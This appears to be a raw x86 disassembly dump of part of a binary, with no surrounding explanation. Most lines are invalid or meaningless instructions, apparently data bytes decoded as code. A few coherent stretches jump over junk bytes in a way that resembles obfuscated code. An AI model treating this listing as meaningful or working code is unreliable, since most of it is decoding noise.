  40bdc1:	mov    WORD PTR [edx-0x79],cs
  40bdc4:	inc    ebp
  40bdc5:	mov    DWORD PTR ds:0xd3a67374,edi
  40bdcb:	cmp    DWORD PTR [ebp-0x5d],ebx
  40bdce:	xchg   ebx,eax
  40bdcf:	mov    ah,0xca
  40bdd1:	xor    bl,bl
  40bdd3:	call   eax
  40bdd5:	mov    WORD PTR [esi+0x519237fa],es
  40bddb:	adc    DWORD PTR [ebp-0x7dba9ce5],ecx
  40bde1:	jmp    0x40bdd3
  40bde3:	ds pop edi
  40bde5:	cmp    DWORD PTR [edi-0xe],edx
  40bde8:	pop    ebx
  40bde9:	pushf  
  40bdea:	inc    edx
  40bdeb:	jp     0x40bd91
  40bded:	mov    cl,0xaa
  40bdef:	and    eax,0xe3dcef53
  40bdf4:	mov    edx,0x8b0db460
  40bdf9:	mov    al,0x45
  40bdfb:	in     al,dx
  40bdfc:	out    0xa8,al
  40bdfe:	in     eax,dx
  40bdff:	icebp  
  40be00:	cmp    ah,bl
  40be02:	pop    esp
  40be03:	xlat   BYTE PTR ds:[ebx]
  40be04:	pop    eax
  40be05:	sub    dl,BYTE PTR [eax+0x45]
  40be08:	out    0x8b,al
  40be0a:	push   ebx
  40be0b:	sbb    esp,DWORD PTR ds:0x3145a831
  40be11:	fucomp st(1)
  40be13:	hlt    
  40be14:	fimul  DWORD PTR [edi+0x6e5503be]
  40be1a:	test   DWORD PTR [esi-0x7b],ecx
  40be1d:	cdq    
  40be1e:	jnp    0x40be98
  40be20:	loopne 0x40be76
  40be22:	inc    esp
  40be23:	mov    ax,0xe12c
  40be27:	add    eax,0x2fc940c7
  40be2c:	(bad)  
  40be2e:	mov    esp,0x4eefe9fe
  40be33:	add    dh,BYTE PTR [ecx+0x6350b55b]
  40be39:	bound  eax,QWORD PTR [ebp+0x6f]
  40be3c:	shl    BYTE PTR [ebp-0x2f],1
  40be3f:	mov    dl,0xc3
  40be41:	bound  esp,QWORD PTR [ebp+0x77d1ae2d]
  40be47:	popa   
  40be48:	mov    ds:0xff00ba86,al
  40be4d:	test   BYTE PTR [edi-0x2e4a62e0],0x6
  40be54:	inc    ebp
  40be55:	add    BYTE PTR [eax-0x14],0x9f
  40be59:	stc    
  40be5a:	cwde   
  40be5b:	loopne 0x40be3b
  40be5d:	(bad)  
  40be5e:	and    dl,ch
  40be60:	add    DWORD PTR [edx-0x656d34db],edx
  40be66:	mov    esp,0xd88b9336
  40be6b:	inc    ebp
  40be6c:	add    eax,0xfab8d699
  40be71:	sar    DWORD PTR [eax-0x542a61a4],cl
  40be77:	sbb    al,0xc5
  40be79:	jns    0x40bec0
  40be7b:	pop    esp
  40be7c:	jnp    0x40be59
  40be7e:	stos   BYTE PTR es:[edi],al
  40be7f:	xor    edi,DWORD PTR [esi+0x2a7bfac7]
  40be85:	retf   0x662c
  40be88:	jne    0x40bef7
  40be8a:	mov    eax,ds:0x51d24d96
  40be8f:	mov    ch,0x76
  40be91:	push   eax
  40be92:	sbb    eax,0x63ae86a
  40be97:	and    ecx,esp
  40be99:	fsub   st,st(1)
  40be9b:	xchg   edx,eax
  40be9c:	int3   
  40be9d:	aam    0x95
  40be9f:	adc    DWORD PTR [ebx-0x343f0409],eax
  40bea5:	jmp    0xf955:0xf34d9d88
  40beac:	cld    
  40bead:	sbb    bl,BYTE PTR [edx+0x7e]
  40beb0:	nop
  40beb1:	aas    
  40beb2:	xlat   BYTE PTR ds:[ebx]
  40beb3:	ja     0x40beec
  40beb5:	rol    cl,1
  40beb7:	popa   
  40beb8:	add    DWORD PTR [ebp+0x18],ebp
  40bebb:	out    0xd6,eax
  40bebd:	mov    bl,0x3f
  40bebf:	pop    es
  40bec0:	(bad)  
  40bec1:	mov    ebp,0xced42b8a
  40bec6:	xchg   edx,eax
  40bec7:	neg    DWORD PTR [edi+0x7f]
  40beca:	aas    
  40becb:	xor    BYTE PTR [edx],bh
  40becd:	mov    ds:0x22cd5626,eax
  40bed2:	enter  0x2183,0xa8
  40bed6:	iret   
  40bed7:	adc    eax,0xa51f996b
  40bedc:	fldenv [edi+0x7a]
  40bedf:	dec    esi
  40bee0:	mov    esi,0xaf988011
  40bee5:	inc    ecx
  40bee6:	test   al,0xe7
  40bee8:	cs pop ecx
  40beea:	cmp    DWORD PTR [ecx+edx*2-0xd37292f],0xffffff9b
  40bef2:	scas   al,BYTE PTR es:[edi]
  40bef3:	leave  
  40bef4:	push   esi
  40bef5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bef6:	inc    ecx
  40bef7:	push   eax
  40bef8:	jecxz  0x40bef1
  40befa:	scas   eax,DWORD PTR es:[edi]
  40befb:	xchg   DWORD PTR [ebp-0x24],esp
  40befe:	or     eax,0x412762e9
  40bf03:	cli    
  40bf04:	lods   al,BYTE PTR ds:[esi]
  40bf05:	xchg   DWORD PTR [edx],edx
  40bf07:	test   BYTE PTR [esp+eax*1-0x11296a5c],0xe6
  40bf0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf10:	or     al,0xf8
  40bf12:	push   esp
  40bf13:	or     esi,DWORD PTR [edi+0x45]
  40bf16:	jb     0x40bf59
  40bf18:	pop    ebp
  40bf19:	inc    ebx
  40bf1a:	xor    dl,BYTE PTR [eax]
  40bf1c:	sub    BYTE PTR [ebp-0x134827cd],ah
  40bf22:	pop    esi
  40bf23:	push   edx
  40bf24:	mov    dh,bl
  40bf26:	inc    edi
  40bf27:	daa    
  40bf28:	adc    edx,DWORD PTR [esi]
  40bf2a:	retf   0x35c
  40bf2d:	inc    edi
  40bf2e:	mov    bh,0x97
  40bf30:	sbb    BYTE PTR [eax],dl
  40bf32:	outs   dx,BYTE PTR ds:[esi]
  40bf33:	clc    
  40bf34:	bound  esi,QWORD PTR [esi]
  40bf36:	lds    esi,FWORD PTR [eax+0x48]
  40bf39:	mov    WORD PTR [eax-0x59],ss
  40bf3c:	jecxz  0x40bf1b
  40bf3e:	cmp    dh,ah
  40bf40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf41:	cdq    
  40bf42:	jb     0x40bf1d
  40bf44:	stos   DWORD PTR es:[edi],eax
  40bf45:	push   esp
  40bf46:	out    dx,eax
  40bf47:	dec    esp
  40bf48:	add    DWORD PTR [ecx],0x67
  40bf4b:	add    ebx,esi
  40bf4d:	inc    esi
  40bf4e:	fstp   st(2)
  40bf50:	jg     0x40bef8
  40bf52:	xor    eax,0xa9e5122d
  40bf57:	(bad)  
  40bf58:	fs dec esi
  40bf5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf5b:	call   0xb6bcb9b8
  40bf60:	hlt    
  40bf61:	mov    BYTE PTR [eax],0x3b
  40bf64:	mov    ebx,0xeacaf28b
  40bf69:	sub    bl,cl
  40bf6b:	mov    esp,0x6b882424
  40bf70:	mov    DWORD PTR ds:0x9b9f544e,ebx
  40bf76:	popf   
  40bf77:	mov    al,es:0xd3546c0c
  40bf7d:	(bad)  
  40bf7e:	iret   
  40bf7f:	ins    BYTE PTR es:[edi],dx
  40bf80:	adc    DWORD PTR [esi-0x4d],ebp
  40bf83:	cwde   
  40bf84:	or     ebx,DWORD PTR [eax-0x3a]
  40bf87:	jp     0x40bf85
  40bf89:	xchg   ebp,ecx
  40bf8b:	and    ah,BYTE PTR [ebx]
  40bf8d:	pop    esi
  40bf8e:	push   es
  40bf8f:	xchg   DWORD PTR [ecx+0x76],ecx
  40bf92:	mov    ecx,0xf27ebcac
  40bf97:	xor    al,BYTE PTR [esp+edx*8]
  40bf9a:	and    BYTE PTR [ecx-0xa237154],dl
  40bfa0:	push   ds
  40bfa1:	xor    eax,0x52e3d9f6
  40bfa6:	and    DWORD PTR [bx],eax
  40bfa9:	inc    edi
  40bfaa:	ret    
  40bfab:	popf   
  40bfac:	adc    dl,bl
  40bfae:	mov    DWORD PTR [edx-0x46],esi
  40bfb1:	xor    esp,DWORD PTR [ecx+0x75b0b9b4]
  40bfb7:	mov    ds:0x69cf82c6,al
  40bfbc:	and    BYTE PTR [edx-0x1db553bb],bl
  40bfc2:	(bad)  
  40bfc3:	out    0x24,al
  40bfc5:	xchg   edi,eax
  40bfc6:	gs and eax,0xb98ee3
  40bfcc:	jno    0x40c029
  40bfce:	nop    DWORD PTR [ebp-0x6d]
  40bfd2:	stos   DWORD PTR es:[edi],eax
  40bfd3:	cmp    bh,cl
  40bfd5:	push   esi
  40bfd6:	mov    cs,WORD PTR [ebp+0x61]
  40bfd9:	xlat   BYTE PTR ds:[ebx]
  40bfda:	repz mov ah,BYTE PTR [ecx]
  40bfdd:	mov    ecx,0x1e76e71e
  40bfe2:	mov    ah,0xb1
  40bfe4:	adc    esp,DWORD PTR ds:0x619bb0d5
  40bfea:	sub    dl,dh
  40bfec:	or     eax,0x5ccf2e6a
  40bff1:	idiv   BYTE PTR [edx-0x59be3a5d]
  40bff7:	adc    al,0x89
  40bff9:	imul   ecx,eax,0x16046ddb
  40bfff:	and    eax,0x2e5d22b2
  40c004:	fbld   TBYTE PTR [esi-0x22]
  40c007:	clc    
  40c008:	mov    dl,ch
  40c00a:	leave  
  40c00b:	jbe    0x40c01e
  40c00d:	das    
  40c00e:	lds    ebp,FWORD PTR [ebx]
  40c010:	jl     0x40bfea
  40c012:	add    DWORD PTR [ebx+ebx*2+0x7e9aaa81],eax
  40c019:	add    ah,BYTE PTR [esi]
  40c01b:	rol    DWORD PTR [ecx-0x2d],cl
  40c01e:	leave  
  40c01f:	cli    
  40c020:	stc    
  40c021:	test   DWORD PTR [esi-0x4a],ecx
  40c024:	imul   edi,ebx,0x4a0c76cb
  40c02a:	lahf   
  40c02b:	jecxz  0x40c07d
  40c02d:	icebp  
  40c02e:	shl    dh,0x58
  40c031:	lahf   
  40c032:	push   ds
  40c033:	dec    BYTE PTR [eax+0x591e568]
  40c039:	nop
  40c03a:	std    
  40c03b:	popa   
  40c03c:	push   edi
  40c03d:	mov    esi,ds
  40c03f:	or     ebp,DWORD PTR [edx]
  40c041:	(bad)  
  40c042:	mov    ds:0xfb147f8f,al
  40c047:	jge    0x40c00a
  40c049:	inc    esp
  40c04a:	mov    cl,0x1f
  40c04c:	jmp    0x40c050
  40c04e:	inc    edi
  40c04f:	inc    edi
  40c050:	fisubr WORD PTR [eax-0xc]
  40c053:	sub    DWORD PTR [esi+0x4cd336d7],esp
  40c059:	outs   dx,DWORD PTR ds:[esi]
  40c05a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c05b:	aaa    
  40c05c:	or     bh,ch
  40c05e:	mov    esp,0xf9c3a58c
  40c063:	pop    esi
  40c064:	and    DWORD PTR [edi],eax
  40c066:	push   0xffffffbf
  40c068:	sbb    eax,0x1ce9f578
  40c06d:	cmp    ch,BYTE PTR [eax+0x7f]
  40c070:	loop   0x40c013
  40c072:	(bad)  
  40c073:	loopne 0x40c09f
  40c075:	test   DWORD PTR [esi+ebp*1],0x6485eab5
  40c07c:	xchg   ecx,eax
  40c07d:	mov    ecx,0x3a295129
  40c082:	adc    BYTE PTR [ebx],0x34
  40c085:	mov    esi,0xba423123
  40c08a:	push   esi
  40c08b:	and    al,0x32
  40c08d:	pusha  
  40c08e:	push   esi
  40c08f:	leave  
  40c090:	in     al,0xaf
  40c092:	fld    st(1)
  40c094:	test   al,0x9
  40c096:	sbb    ebx,DWORD PTR [edx-0x7]
  40c099:	inc    edi
  40c09a:	fwait
  40c09b:	or     dl,BYTE PTR [ebx-0x55]
  40c09e:	jl     0x40c031
  40c0a0:	(bad)  
  40c0a1:	push   ds
  40c0a2:	xor    BYTE PTR ds:0x529faaa1,bl
  40c0a8:	arpl   WORD PTR [ecx],si
  40c0aa:	push   0x639d592
  40c0af:	dec    edx
  40c0b0:	daa    
  40c0b1:	hlt    
  40c0b2:	or     eax,0x78ece6
  40c0b7:	inc    esp
  40c0b8:	mov    eax,ds:0xd1a2d022
  40c0bd:	push   0xffffffce
  40c0bf:	shl    DWORD PTR [esi-0x65d0186c],0xee
  40c0c6:	mov    ds:0x8b66c82b,al
  40c0cb:	inc    ebp
  40c0cc:	cld    
  40c0cd:	movzx  eax,ax
  40c0d0:	sub    ecx,edi
  40c0d2:	cmp    eax,ecx
  40c0d4:	mov    eax,DWORD PTR [ebp-0x14]
  40c0d7:	movzx  ecx,WORD PTR [ebp-0x4]
  40c0db:	jg     0x40c0f0
  40c0e1:	xor    eax,esi
  40c0e3:	sub    ecx,eax
  40c0e5:	sub    ecx,edi
  40c0e7:	mov    WORD PTR [ebp-0x4],cx
  40c0eb:	jmp    0x40c44a
  40c0f0:	xor    eax,esi
  40c0f2:	jmp    0x40c43f
  40c0f7:	nop
  40c0f8:	push   esp
  40c0f9:	in     al,dx
  40c0fa:	shr    eax,1
  40c0fc:	jno    0x40c0af
  40c0fe:	push   ebp
  40c0ff:	mov    ss,WORD PTR [ecx+esi*8+0x70]
  40c103:	mov    edx,0x6993a11b
  40c108:	sti    
  40c109:	jle    0x40c189
  40c10b:	cs jge 0x40c18c
  40c10e:	jle    0x40c10f
  40c110:	ror    DWORD PTR [edx-0x1f8a8895],cl
  40c116:	cmp    eax,0x96f75c8b
  40c11b:	push   0x552050e5
  40c120:	dec    edi
  40c121:	iret   
  40c122:	in     al,0x8e
  40c124:	push   0xffffffed
  40c126:	jnp    0x40c0e7
  40c128:	das    
  40c129:	xor    eax,0xd74c770b
  40c12e:	rcl    ebp,cl
  40c130:	mov    ecx,0x5976eb18
  40c135:	clc    
  40c136:	mov    edi,0x375162e2
  40c13b:	jmp    0x8be897d7
  40c140:	sbb    BYTE PTR [ebp+0x46],cl
  40c143:	and    BYTE PTR [esi+eax*2-0x401a8627],ah
  40c14a:	enter  0xb469,0xd0
  40c14e:	xchg   edx,eax
  40c14f:	fist   WORD PTR [ecx+0x2140aee5]
  40c155:	mov    eax,0x41fd6cdc
  40c15a:	mov    ch,0x4a
  40c15c:	mov    bh,0xcd
  40c15e:	and    eax,0xdd35b7a
  40c163:	push   cs
  40c164:	aam    0x3
  40c166:	add    al,0x69
  40c168:	add    dh,BYTE PTR [ecx+0x1c]
  40c16b:	les    ebx,FWORD PTR [esi]
  40c16d:	rcr    BYTE PTR [edx-0xbc8b392],1
  40c173:	or     al,0xe3
  40c175:	retf   
  40c176:	inc    eax
  40c177:	mov    dl,0x4e
  40c179:	pop    ss
  40c17a:	popa   
  40c17b:	pushf  
  40c17c:	cmp    eax,0xc28e3f17
  40c181:	leave  
  40c182:	push   edx
  40c183:	imul   esi,DWORD PTR [edi+0x352bf435],0x9b9a2e1b
  40c18d:	cmp    eax,eax
  40c18f:	cs dec edi
  40c191:	xchg   DWORD PTR [eax+eiz*2+0x53],ebp
  40c195:	lock mov gs:0x6be078ed,eax
  40c19c:	pop    ss
  40c19d:	push   ss
  40c19e:	lock out dx,al
  40c1a0:	xlat   BYTE PTR ds:[ebx]
  40c1a1:	rol    BYTE PTR [edx+0x69378464],0x96
  40c1a8:	fdiv   st(6),st
  40c1aa:	cmc    
  40c1ab:	xor    al,0x97
  40c1ad:	xchg   edx,eax
  40c1ae:	xchg   ebp,eax
  40c1af:	mov    ebp,0x6c2c545c
  40c1b4:	(bad)  
  40c1b5:	shl    BYTE PTR [ecx-0x710ce2f7],1
  40c1bb:	push   ebx
  40c1bc:	xchg   ecx,eax
  40c1bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1be:	int    0x8d
  40c1c0:	mov    ch,0xe2
  40c1c2:	xchg   esp,eax
  40c1c3:	mov    bl,0x59
  40c1c5:	addr16 mov ebp,0xdcf22602
  40c1cb:	fld    DWORD PTR [esi+0x20]
  40c1ce:	add    cl,dh
  40c1d0:	in     eax,0x44
  40c1d2:	jbe    0x40c1c6
  40c1d4:	inc    edx
  40c1d5:	dec    esi
  40c1d6:	jl     0x40c1e4
  40c1d8:	inc    esp
  40c1d9:	in     al,0x72
  40c1db:	loope  0x40c184
  40c1dd:	or     al,0x23
  40c1df:	cmp    eax,0x568678b
  40c1e4:	dec    ecx
  40c1e5:	daa    
  40c1e6:	cmp    al,0xd2
  40c1e8:	(bad)  
  40c1e9:	in     eax,dx
  40c1ea:	int    0xe7
  40c1ec:	pop    edx
  40c1ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1ee:	in     eax,dx
  40c1ef:	test   eax,esi
  40c1f1:	repnz push ds
  40c1f3:	push   0xffffffec
  40c1f5:	out    0x8b,al
  40c1f7:	pushf  
  40c1f8:	idiv   BYTE PTR [ecx+0xc372e40]
  40c1fe:	mov    ds:0x52466579,al
  40c203:	cdq    
  40c204:	sbb    ah,BYTE PTR [ecx+0xdc33e6b]
  40c20a:	lods   eax,DWORD PTR ds:[esi]
  40c20b:	ret    
  40c20c:	bnd jmp 0x86091187
  40c212:	call   0xcf3d:0x8ebf5cb1
  40c219:	cli    
  40c21a:	retf   0x313
  40c21d:	and    eax,0x5d19a1f9
  40c222:	retf   0x7b72
  40c225:	mov    ebx,0x6791f460
  40c22a:	outs   dx,BYTE PTR ds:[esi]
  40c22b:	lock or BYTE PTR [ebp-0x683bab93],dh
  40c232:	xchg   DWORD PTR [esi+0x5244a0f6],ecx
  40c238:	ins    DWORD PTR es:[edi],dx
  40c239:	jns    0x40c243
  40c23b:	sbb    ebx,esi
  40c23d:	and    BYTE PTR [eax+edx*2+0x799eb5d0],0xb5
  40c245:	cmp    esp,DWORD PTR [edi+0x74]
  40c248:	arpl   WORD PTR [esi+eiz*4-0x62efa127],bx
  40c24f:	fldcw  WORD PTR [ecx]
  40c251:	mov    esp,0xb2572b3e
  40c256:	jg     0x40c282
  40c258:	pop    ds
  40c259:	ins    BYTE PTR es:[edi],dx
  40c25a:	lea    eax,[eax-0x42]
  40c25d:	loope  0x40c288
  40c25f:	push   ss
  40c260:	xchg   edi,eax
  40c261:	mov    edi,DWORD PTR [eax+0x30]
  40c264:	push   es
  40c265:	xchg   esi,eax
  40c266:	cs clc 
  40c268:	xchg   BYTE PTR [eax],bl
  40c26a:	adc    ah,BYTE PTR [esi]
  40c26c:	mov    ebp,0xa8bf0604
  40c271:	pop    edx
  40c272:	fsub   st,st(5)
  40c274:	jp     0x40c25e
  40c276:	daa    
  40c277:	nop
  40c278:	and    DWORD PTR [esi],0x3278fac0
  40c27e:	dec    DWORD PTR [edx]
  40c280:	sbb    BYTE PTR [ecx+0x2889b174],ch
  40c286:	out    dx,al
  40c287:	retf   
  40c288:	cdq    
  40c289:	pop    eax
  40c28a:	in     eax,0x73
  40c28c:	adc    ebx,ecx
  40c28e:	or     al,0x6b
  40c290:	cld    
  40c291:	jle    0x40c249
  40c293:	push   ss
  40c294:	xchg   edi,eax
  40c295:	add    BYTE PTR [edx],bh
  40c297:	mov    ebx,0x8f7d8e60
  40c29c:	xlat   BYTE PTR ds:[ebx]
  40c29d:	das    
  40c29e:	sbb    eax,0xd773550b
  40c2a3:	push   cs
  40c2a4:	add    eax,DWORD PTR [edx-0x69]
  40c2a7:	sub    eax,0x4b81de58
  40c2ac:	sbb    dh,al
  40c2ae:	mov    al,ds:0x10a06d6d
  40c2b3:	sub    al,0x91
  40c2b5:	scas   al,BYTE PTR es:[edi]
  40c2b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2b7:	dec    ebx
  40c2b8:	call   0x95d16b5
  40c2bd:	int    0xd3
  40c2bf:	imul   ecx,DWORD PTR [ebp-0x3a161c1b],0xe77c2d82
  40c2c9:	jle    0x40c2d2
  40c2cb:	(bad)  
  40c2cc:	push   ecx
  40c2cd:	(bad)  
  40c2ce:	cdq    
  40c2cf:	jge    0x40c34b
  40c2d1:	fcomp  DWORD PTR [esi+0x77987a45]
  40c2d7:	outs   dx,DWORD PTR ds:[esi]
  40c2d8:	mov    bh,BYTE PTR [edi+ebp*4-0x7d]
  40c2dc:	dec    esp
  40c2dd:	add    cl,BYTE PTR [edx+eax*8-0x5d834bda]
  40c2e4:	adc    eax,0x8538fb82
  40c2e9:	or     esi,edi
  40c2eb:	imul   edx,DWORD PTR [edi+eiz*8],0xffffffaf
  40c2ef:	mov    bh,0xe8
  40c2f1:	mov    al,BYTE PTR [edi-0x77986c5c]
  40c2f7:	mov    ah,0xce
  40c2f9:	jge    0x40c2e9
  40c2fb:	std    
  40c2fc:	mov    bh,0x31
  40c2fe:	xor    BYTE PTR [esi-0x6b],bh
  40c301:	push   ds
  40c302:	push   ebx
  40c303:	je     0x40c293
  40c305:	jbe    0x40c2aa
  40c307:	aad    0x56
  40c309:	ins    BYTE PTR es:[edi],dx
  40c30a:	lods   eax,DWORD PTR ds:[esi]
  40c30b:	data16 or al,0x87
  40c30e:	xchg   ebp,eax
  40c30f:	shl    BYTE PTR [edx+esi*1],cl
  40c312:	stos   DWORD PTR es:[edi],eax
  40c313:	bound  esp,QWORD PTR [ecx+ebp*1]
  40c316:	into   
  40c317:	jg     0x40c2b7
  40c319:	fsubp  st(3),st
  40c31b:	pop    edi
  40c31c:	arpl   WORD PTR es:[eax],dx
  40c31f:	xor    dl,dl
  40c321:	and    ah,al
  40c323:	and    BYTE PTR [edi],0x7c
  40c326:	mov    WORD PTR [edx+ebp*8+0x71737e3e],cs
  40c32d:	and    al,0x65
  40c32f:	fstp   QWORD PTR [edx]
  40c331:	mov    eax,0xe063a6fe
  40c336:	pop    edi
  40c337:	cmp    dl,BYTE PTR ds:0xecf3ddf0
  40c33d:	mov    ebx,0x73bcdb4f
  40c342:	pop    edx
  40c343:	ret    0x5775
  40c346:	xchg   ebx,eax
  40c347:	jge    0x40c2e6
  40c349:	imul   ebx,DWORD PTR [eax+0x5e9e8636],0x2b5e2632
  40c353:	add    DWORD PTR [ebp+ebx*2-0x80],ecx
  40c357:	pop    ebp
  40c358:	xchg   BYTE PTR [ebx-0x32111a4e],dl
  40c35e:	test   DWORD PTR [edx+0x3d62501d],0xb0740b5a
  40c368:	stos   DWORD PTR es:[edi],eax
  40c369:	jnp    0x40c3b0
  40c36b:	in     al,dx
  40c36c:	jnp    0x40c32e
  40c36e:	aaa    
  40c36f:	mov    ?,WORD PTR [edx+0x50]
  40c372:	sub    bl,BYTE PTR [ebx+0x750c7ce8]
  40c378:	mov    edx,0xb850f2dc
  40c37d:	lahf   
  40c37e:	hlt    
  40c37f:	in     eax,0x87
  40c381:	xchg   esp,eax
  40c382:	sbb    bh,BYTE PTR [ebx]
  40c384:	arpl   WORD PTR [esi],dx
  40c386:	sub    ebp,DWORD PTR [ebx-0x5e92e735]
  40c38c:	xchg   edx,eax
  40c38d:	push   ebp
  40c38e:	sbb    BYTE PTR [ecx-0x50],bh
  40c391:	daa    
  40c392:	or     DWORD PTR [ebx+ebx*2-0x6d],0xd8e5298
  40c39a:	xchg   ecx,eax
  40c39b:	les    ebx,FWORD PTR [ecx+0x2b]
  40c39e:	hlt    
  40c39f:	lods   eax,DWORD PTR ds:[esi]
  40c3a0:	(bad)  
  40c3a1:	adc    al,0x22
  40c3a3:	imul   ebx,DWORD PTR [edi-0x3d33cb29],0xffffffa9
  40c3aa:	fwait
  40c3ab:	stos   DWORD PTR es:[edi],eax
  40c3ac:	adc    eax,DWORD PTR [eax]
  40c3ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3af:	fisubr DWORD PTR [esi+0x15]
  40c3b2:	sbb    DWORD PTR [ebx-0x73],0xffffff8b
  40c3b6:	pop    ss
  40c3b7:	fst    DWORD PTR [eax-0x4e]
  40c3ba:	fs sub ebp,esp
  40c3bd:	icebp  
  40c3be:	loop   0x40c439
  40c3c0:	fld    QWORD PTR [eax+0x56]
  40c3c3:	imul   eax,DWORD PTR [ecx+0x31],0x7e
  40c3c7:	not    DWORD PTR [ebp-0x3d]
  40c3ca:	sub    ebp,edx
  40c3cc:	push   0x3e
  40c3ce:	jno    0x40c3ff
  40c3d0:	mov    eax,0xcd058c0c
  40c3d5:	fs xchg ebp,esp
  40c3d8:	outs   dx,DWORD PTR ds:[esi]
  40c3d9:	xchg   edx,eax
  40c3da:	adc    edx,edi
  40c3dc:	jp     0x40c3cf
  40c3de:	cld    
  40c3df:	ret    0x70da
  40c3e2:	lea    ebp,[eax+0x1b]
  40c3e5:	icebp  
  40c3e6:	add    DWORD PTR [esi+0x4484baf9],ebp
  40c3ec:	lds    esp,FWORD PTR [ebx]
  40c3ee:	mov    ebx,DWORD PTR [eax]
  40c3f0:	cmp    DWORD PTR [ecx],edi
  40c3f2:	push   ebx
  40c3f3:	retf   
  40c3f4:	mov    ch,0x45
  40c3f6:	inc    ecx
  40c3f7:	sbb    bh,cl
  40c3f9:	(bad)  
  40c3fa:	pop    ss
  40c3fb:	cmp    BYTE PTR [ebx-0x3941d946],dh
  40c401:	sub    eax,0x356b38f5
  40c406:	shl    DWORD PTR [ebx+0x630783f6],1
  40c40c:	stos   BYTE PTR es:[edi],al
  40c40d:	lods   al,BYTE PTR ds:[esi]
  40c40e:	lahf   
  40c40f:	ret    
  40c410:	je     0x40c3e3
  40c412:	je     0x40c44d
  40c414:	stos   DWORD PTR es:[edi],eax
  40c415:	mov    bl,0x6
  40c417:	ficomp DWORD PTR [edx+eax*8-0x12dd7ece]
  40c41e:	ja     0x40c43b
  40c420:	out    dx,eax
  40c421:	lds    ebx,FWORD PTR [edi]
  40c423:	lds    ecx,FWORD PTR [ecx+0x5acf3f2]
  40c429:	inc    edi
  40c42a:	push   edx
  40c42b:	sub    dh,BYTE PTR [ebp-0x2a]
  40c42e:	xchg   ebx,eax
  40c42f:	aaa    
  40c430:	mov    ebx,0x1728e91f
  40c435:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c436:	mov    DWORD PTR [edx+0xa0d8f88],ecx
  40c43c:	inc    eax
  40c43d:	dec    edi
  40c43e:	pop    ebx
  40c43f:	lea    eax,[eax+ecx*1+0x32729b]
  40c446:	mov    WORD PTR [ebp-0x4],ax
  40c44a:	mov    eax,DWORD PTR [ebp-0xc]
  40c44d:	cmp    eax,ebx
  40c44f:	je     0x40c463
  40c455:	mov    eax,DWORD PTR [ebp-0x8]
  40c458:	mov    DWORD PTR [eax],0x60341e89
  40c45e:	jmp    0x40cba4
  40c463:	mov    eax,DWORD PTR [ebp+0x8]
  40c466:	mov    ecx,DWORD PTR [ebp-0x8]
  40c469:	xor    eax,esi
  40c46b:	add    eax,edi
  40c46d:	cmp    DWORD PTR [ecx],eax
  40c46f:	je     0x40cb8c
  40c475:	mov    ecx,DWORD PTR [ebp-0x18]
  40c478:	mov    eax,DWORD PTR [ebp-0x8]
  40c47b:	mov    eax,DWORD PTR [eax]
  40c47d:	mov    eax,DWORD PTR [eax+0x3c]
  40c480:	lea    ecx,[ecx*8+0x78]
  40c487:	add    eax,ecx
  40c489:	jmp    0x40c7d6
  40c48e:	ffree  st(2)
  40c490:	les    esp,FWORD PTR ds:0xc2dd21e1
  40c496:	xchg   ebp,eax
  40c497:	(bad)  
  40c498:	sub    edx,DWORD PTR [edi+0x34]
  40c49b:	imul   edi,DWORD PTR [ebx+0x7e871960],0x7e
  40c4a2:	cs jge 0x40c523
  40c4a5:	jle    0x40c487
  40c4a7:	leave  
  40c4a8:	repz arpl WORD PTR [edi+0x4eabf947],ax
  40c4af:	jle    0x40c4a7
  40c4b1:	jecxz  0x40c4d0
  40c4b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4b4:	add    al,0xd5
  40c4b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4b7:	mov    bh,0x5c
  40c4b9:	sbb    eax,0xdb513c1a
  40c4be:	out    dx,eax
  40c4bf:	and    eax,0x627e27b9
  40c4c4:	or     BYTE PTR [eax],cl
  40c4c6:	daa    
  40c4c7:	ret    0xfe7
  40c4ca:	jno    0x40c45b
  40c4cc:	enter  0x27b8,0xf6
  40c4d0:	je     0x40c513
  40c4d2:	aad    0xda
  40c4d4:	mov    ebx,0x8534b277
  40c4d9:	add    bl,BYTE PTR [edi-0x79]
  40c4dc:	sbb    al,0x91
  40c4de:	loop   0x40c4a9
  40c4e0:	rcr    BYTE PTR [ecx+esi*2-0x5a16ed44],cl
  40c4e7:	inc    BYTE PTR [edi-0x10b59692]
  40c4ed:	out    dx,al
  40c4ee:	push   edi
  40c4ef:	dec    edx
  40c4f0:	add    BYTE PTR [eax-0xe4a13d9],ah
  40c4f6:	jae    0x40c506
  40c4f8:	je     0x40c4bf
  40c4fa:	push   edx
  40c4fb:	mov    edx,DWORD PTR [eax+0x17ff1a3e]
  40c501:	lds    esi,FWORD PTR [esi-0x2d18d3b4]
  40c507:	jge    0x40c521
  40c509:	jb     0x40c4a4
  40c50b:	inc    eax
  40c50c:	xor    DWORD PTR [ecx+0x5b],0xffffff90
  40c510:	pop    ss
  40c511:	add    DWORD PTR [ebx+0xbb3cb92],ecx
  40c517:	xchg   edx,eax
  40c518:	xchg   edx,eax
  40c519:	or     eax,0x7f5672c1
  40c51e:	and    BYTE PTR [edx-0x4],cl
  40c521:	mov    esp,edx
  40c523:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c524:	inc    edx
  40c525:	push   eax
  40c526:	(bad)  
  40c527:	out    dx,al
  40c528:	inc    ecx
  40c529:	mov    dh,0x5c
  40c52b:	pop    ecx
  40c52c:	sub    ch,BYTE PTR [edx]
  40c52e:	push   DWORD PTR [ebx-0x62]
  40c531:	les    edx,FWORD PTR [edi-0x3e]
  40c534:	into   
  40c535:	and    DWORD PTR [edx],edi
  40c537:	outs   dx,BYTE PTR ds:[esi]
  40c538:	out    0xc6,eax
  40c53a:	or     eax,0x411dc220
  40c53f:	adc    DWORD PTR cs:[edi-0x6e391842],ebp
  40c546:	cwde   
  40c547:	push   cs
